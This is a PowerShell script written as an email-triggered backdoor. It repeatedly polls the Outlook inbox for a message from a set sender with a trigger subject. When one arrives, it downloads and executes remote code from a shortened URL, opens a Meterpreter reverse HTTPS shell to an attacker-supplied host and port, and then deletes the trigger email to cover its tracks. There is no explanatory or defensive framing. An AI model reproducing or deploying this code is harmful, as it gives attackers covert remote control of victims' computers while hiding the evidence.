[CmdletBinding()] Param(
        [Parameter(Position=0, Mandatory = $True)]
        [String]
        $Email,

        [Parameter(Position=1, Mandatory = $True)]
        [String]
        $Trigger,


)
function Persist{
While($True){
$olFolderInbox = 6
$outlook = new-object -com outlook.application;
$ns = $outlook.GetNameSpace("MAPI");
$inbox = $ns.GetDefaultFolder($olFolderInbox)
$Emails = $inbox.items
$Emails | foreach { 
if($_.SenderEmailAddress -match $Email -and $_.subject -match $Trigger)
{Start-Job -ScriptBlock {$WebClientObject = New-Object Net.WebClient
IEX $WebClientObject.DownloadString('http://goo.gl/yfLfQB')
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST $global:IP -LPORT $global:Port -

Force}
}}

$Emails | foreach { 
if($_.SenderEmailAddress -match $Email -and $_.subject -match $Trigger)
{$OutlookFolders = $outlook.Session.Folders.Item(1).Folders
$EmailInFolderToDelete = $outlook.Session.Folders.Item(1).Folders.Item("Inbox").Items
$EmailToDelete = $EmailInFolderToDelete | Where-Object {$_.Subject -eq $Trigger -and 

$_.SenderEmailAddress -eq $Email}
$EmailToDelete.Delete() }

}
#This determines how often the script checks in. Lower sleep time == more noise  
Start-Sleep -s 10 





}
}
